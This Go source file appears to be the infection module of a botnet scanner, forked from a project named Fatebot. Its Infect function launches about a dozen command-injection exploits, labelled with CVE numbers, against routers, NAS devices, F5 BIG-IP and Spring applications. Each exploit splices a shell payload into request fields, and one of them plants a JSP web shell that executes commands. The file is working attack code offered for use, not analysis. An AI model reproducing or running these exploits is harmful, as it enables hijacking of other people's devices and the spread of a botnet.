// fork from https://github.com/boz3r/Fatebot

package cve

import (
	"encoding/json"
	"io"
	"net/http"
	"scanner/components/utils"
	"strings"
)

func Infect(Address string, Port int) {
	

	CVE_2014_8361(Address)
	CVE_2017_17215(Address)
	CVE_2020_10987(Address)
	CVE_2020_25506(Address)
	CVE_2021_35395(Address)
	CVE_2022_1388(Address)
	func() {
		CVE_2022_22965_sub(Address) 
		CVE_2022_22965_main(Address)
	}()
	CVE_2022_25075(Address)
	CVE_2022_26186(Address)
	CVE_2022_26210(Address)
	CVE_2022_30525(Address)
	CVE_2022_34538(Address)
}

type Exploit struct {
	exploitName                                                     string
	exploitBody                                                     io.Reader
	exploitMethod, exploitHeader                                    string
	exploitAgent, exploitAccept, exploitContType, exploitConnection string
}

func convReader(body []byte) io.Reader {
	return strings.NewReader(string(body))
}

func setupHTTP(method, url, header string, body io.Reader) (*http.Client, *http.Request, error) {
	httpReq, err := http.NewRequest(method, url+header, body)
	return &http.Client{}, httpReq, err
}

func (e *Exploit) setupExploit(ip string) (*http.Client, *http.Request) {
	httpClient, httpReq, _ := setupHTTP(e.exploitMethod, "http://"+ip+"/", e.exploitHeader, e.exploitBody)
	/*
		Default pre-setup header.
	*/
	httpReq.Header.Set("User-Agent", e.exploitAgent)
	httpReq.Header.Set("Accept", e.exploitAccept)
	httpReq.Header.Set("Content-Type", e.exploitContType)
	httpReq.Header.Set("Connection", e.exploitConnection)
	return httpClient, httpReq
}

func selfRequest(exploit Exploit, tempIP string) *http.Request {
	_, selfReq := exploit.setupExploit(tempIP)
	return selfReq
}

func exploitLauncher(exploit Exploit, exploitReq *http.Request, tempIP string) {
	httpClient, _ := exploit.setupExploit(tempIP)
	httpClient.Do(exploitReq)
}

func inject(arch string, isExploit bool) string {
	return utils.GetShellPayload
}

func CVE_2014_8361(tempIP string) {
	e8361 := Exploit{
		exploitName:       "CVE-2014-8361",
		exploitMethod:     "POST",
		exploitHeader:     "picsdesc.xml",
		exploitBody:       strings.NewReader(string("<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"<http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping> xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`" + inject("mips", true) + "`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>")),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	_, newHeader := e8361.setupExploit(tempIP)
	newHeader.Header.Set("SOAPAction", "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping")
	exploitLauncher(e8361, newHeader, tempIP)
}

func CVE_2017_17215(tempIP string) {
	e17215 := Exploit{
		exploitName:       "CVE-2017-17215",
		exploitMethod:     "POST",
		exploitHeader:     "ctrlt/DeviceUpgrade_1",
		exploitBody:       strings.NewReader(string("<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"<s:Body><u:Upgrade> xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox " + inject("mips", true) + ")</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>")),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	_, newHeader := e17215.setupExploit(tempIP)
	newHeader.Header.Set("Authorization", "Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"")
	exploitLauncher(e17215, newHeader, tempIP)
}

func CVE_2020_10987(tempIP string) {
	e10987 := Exploit{
		exploitName:       "CVE-2020-10987",
		exploitMethod:     "GET",
		exploitHeader:     "goform/setUsbUnload/.js?deviceName=A;" + inject("default", true),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	exploitLauncher(e10987, selfRequest(e10987, tempIP), tempIP)
}

func CVE_2020_25506(tempIP string) {
	e25506 := Exploit{
		exploitName:       "CVE-2020-25506",
		exploitMethod:     "POST",
		exploitHeader:     "cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`" + inject("default", true) + "`",
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	exploitLauncher(e25506, selfRequest(e25506, tempIP), tempIP)
}

func CVE_2021_35395(tempIP string) {
	e35395 := Exploit{
		exploitName:       "CVE-2021-35395",
		exploitMethod:     "POST",
		exploitHeader:     "goform/formWsc",
		exploitBody:       strings.NewReader(string("submit-url=%2Fwlwps.asp&resetUnCfg=0&peerPin=12345678;" + inject("default", true) + ";&setPIN=Start+PIN&configVxd=off&resetRptUnCfg=0&peerRptPin=")),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "close",
	}
	exploitLauncher(e35395, selfRequest(e35395, tempIP), tempIP)
}

func CVE_2022_1388(tempIP string) {
	post1388, _ := json.Marshal(map[string]string{
		"command":     "run",
		"utilCmdArgs": "-c '" + inject("default", true) + "'",
	})
	e1388 := Exploit{
		exploitName:       "CVE-2022-1388",
		exploitMethod:     "POST",
		exploitHeader:     "mgmt/tm/util/bash",
		exploitBody:       convReader(post1388),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/json",
		exploitConnection: "keep-alive, X-F5-Auth-Token",
	}
	_, newHeader := e1388.setupExploit(tempIP)
	newHeader.Header.Set("X-F5-Auth-Token", "NeverGonnaGiveYouUpNeverGonnaLetYouDownNeverGonnaRunAroundAndDesertYou")
	newHeader.Header.Set("Authorization", "Basic YWRtaW46")
	exploitLauncher(e1388, newHeader, tempIP)
}

func CVE_2022_22965_sub(tempIP string) {
	e22965sub := Exploit{
		exploitName:       "",
		exploitMethod:     "POST",
		exploitHeader:     "stupidRumor_war/index",
		exploitBody:       strings.NewReader(string("class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=")),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	_, newHeader := e22965sub.setupExploit(tempIP)
	newHeader.Header.Set("suffix", "%>//")
	newHeader.Header.Set("c1", "Runtime")
	newHeader.Header.Set("c2", "<%")
	newHeader.Header.Set("DNT", "1")
	exploitLauncher(e22965sub, newHeader, tempIP)
}

func CVE_2022_22965_main(tempIP string) {
	e22965main := Exploit{
		exploitName:       "CVE-2022-22965",
		exploitMethod:     "GET",
		exploitHeader:     "stupidRumor_war/tomcatwar.jsp?pwd=j&cmd=" + inject("default", true),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	exploitLauncher(e22965main, selfRequest(e22965main, tempIP), tempIP)
}

func CVE_2022_25075(tempIP string) {
	e25075 := Exploit{
		exploitName:       "CVE-2022-25075",
		exploitMethod:     "GET",
		exploitHeader:     "cgi-bin/downloadFlile.cgi?payload=`" + inject("default", true) + "`",
		exploitAgent:      "007",
		exploitAccept:     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	_, newHeader := e25075.setupExploit(tempIP)
	newHeader.Header.Set("Upgrade-Insecure-Requests", "1")
	newHeader.Header.Set("Cache-Control", "max-age=0")
	exploitLauncher(e25075, newHeader, tempIP)
}

func CVE_2022_26186(tempIP string) {
	e26186 := Exploit{
		exploitName:       "CVE-2022-26186",
		exploitMethod:     "POST",
		exploitHeader:     "cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;" + inject("default", true) + ";&filetype=sh",
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "close",
	}
	_, newHeader := e26186.setupExploit(tempIP)
	newHeader.Header.Set("Cookie", "SESSION_ID=2:1645507767:2")
	newHeader.Header.Set("Upgrade-Insecure-Requests", "1")
	exploitLauncher(e26186, newHeader, tempIP)
}

func CVE_2022_26210(tempIP string) {
	post26210, _ := json.Marshal(map[string]string{
		"topicurl":      "setting/setUpgradeFW",
		"FileName":      ";" + inject("default", true),
		"Flags":         "1",
		"ContentLength": "1",
	})
	e26210 := Exploit{
		exploitName:       "CVE-2022-26210",
		exploitMethod:     "POST",
		exploitHeader:     "cgi-bin/cstecgi.cgi",
		exploitBody:       convReader(post26210),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/json",
		exploitConnection: "close",
	}
	_, newHeader := e26210.setupExploit(tempIP)
	newHeader.Header.Set("X-Requested-With", "XMLHttpRequest")
	newHeader.Header.Set("Cookie", "SESSION_ID=2:1645507767:2")
	exploitLauncher(e26210, newHeader, tempIP)
}

func CVE_2022_30525(tempIP string) {
	post30525, _ := json.Marshal(map[string]string{
		"command":     "setWanPortSt",
		"proto":       "dhcp",
		"port":        "4",
		"vlan_tagged": "1",
		"vlanid":      "5",
		"mtu":         inject("default", true),
		"data":        "dota?",
	})
	e30525 := Exploit{
		exploitName:       "CVE-2022-30525",
		exploitMethod:     "POST",
		exploitHeader:     "ztp/cgi-bin/handler",
		exploitBody:       convReader(post30525),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/json",
		exploitConnection: "close",
	}
	exploitLauncher(e30525, selfRequest(e30525, tempIP), tempIP)
}

func CVE_2022_34538(tempIP string) {
	e34538 := Exploit{
		exploitName:       "CVE-2022-34538",
		exploitMethod:     "GET",
		exploitHeader:     "cgi-bin/admin/vca/bia/addacph.cgi?mod&event=a&id=1&pluginname=;" + inject("default", true) + ";&name=a&evt_id=a",
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "close",
	}
	exploitLauncher(e34538, selfRequest(e34538, tempIP), tempIP)
}
